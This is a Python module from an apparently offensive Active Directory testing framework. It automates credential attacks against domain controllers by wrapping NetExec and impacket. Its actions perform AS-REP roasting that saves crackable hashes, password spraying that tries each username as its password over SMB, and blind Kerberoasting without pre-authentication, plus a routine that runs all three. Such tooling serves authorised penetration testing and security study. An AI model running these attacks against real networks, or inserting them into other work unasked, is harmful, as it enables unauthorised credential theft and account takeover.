# modules/valid_user_no_pass/no_pass.py

from core.module_base import ModuleBase
from utils.input_or_file import get_input_or_file
from utils.run_command import run_command
from colorama import Fore, Style
import os

class ValidUser(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "valid_user"

        self.options = {
            "ip": None,
            "user_file": None,
            "domain": None,
        }

        self.actions = {
            "asreproast": self.asreproast,
            "spray": self.password_spray,
            "blind_kerberoasting": self.blind_kerberoasting,
            "all": self.run_all,
        }

        self.color = Fore.BLUE



    def _prepare(self):
        ip = self.get_param("ip", required=True)
        if not ip:
            return None, None
        ip_list = get_input_or_file(ip)

        if self.options["user_file"]:
            users = get_input_or_file(self.options["user_file"])
        else:
            active = self.context.active_user 
            if not active:
                print("[-] no user (use pick user or set user)")
                return None, None
            users = [active]
        
        return ip_list, users

    '''
    def banner(self):
        print(Fore.BLUE + f"\n\t\t🔥 MODULE {self.name.upper()} 🔥 \n" + Style.RESET_ALL)
        print("\n See options and set a target with 'options'\n")
    '''


    ################## 

    def asreproast(self):
        ip_list, users = self._prepare()
        if not ip_list: return
        for ip in ip_list:
            for user in users:
                outfile = os.path.join("results", f"{user}_asreproast.txt")
                command = ["nxc", "ldap", ip, "-u", user, "-p", "", "--asreproast", outfile]
                out = run_command(command)
                print(f"{Fore.BLUE}[ASREPROAST]{Style.RESET_ALL} {user}@{ip} → {out}")

    def password_spray(self):
        ip_list, users = self._prepare()
        if not ip_list: 
            return
        
        valids = []

        for ip in ip_list:
            for user in users:
                cmd = ["nxc", "smb", ip, "-u", user, "-p", user, "--no-bruteforce", "--continue-on-success"]
                self.run_tool(cmd, key="creds", category="creds", source="spray")
            
            if self.context:
                self.context.commit_pending()


    def blind_kerberoasting(self):
        ip_list, users = self._prepare()
        domain = self.get_param("domain")
        if not domain:
            print("[-] domain must be set for blind kerberoasting.")
            return
            
        for ip in ip_list:
            for user in users:
                command = ["impacket-GetUserSPNs", "-no-preauth", user, "-usersfile", "-", "-dc-host", ip, domain]
                out = self.run_tool(command)
                print(f"{Fore.BLUE}[BLIND_KERB]{Style.RESET_ALL} {user}@{ip} → {out}")
    


    def run_all(self):
        print("\n[🔥] Running all valid_user actions...\n")

        self.options["ip"] = self.get_param("ip", required=True)
        self.options["domain"] = self.get_param("domain")
        if not self.options["ip"]:
            return
        
        self.asreproast()
        print("-"*50)
        self.password_spray()
        print("-"*50)

        if self.options["domain"]:
            self.blind_kerberoasting()
        else:
            print("missing domain, ignoring blind kerberoasting")
            print("-"*50)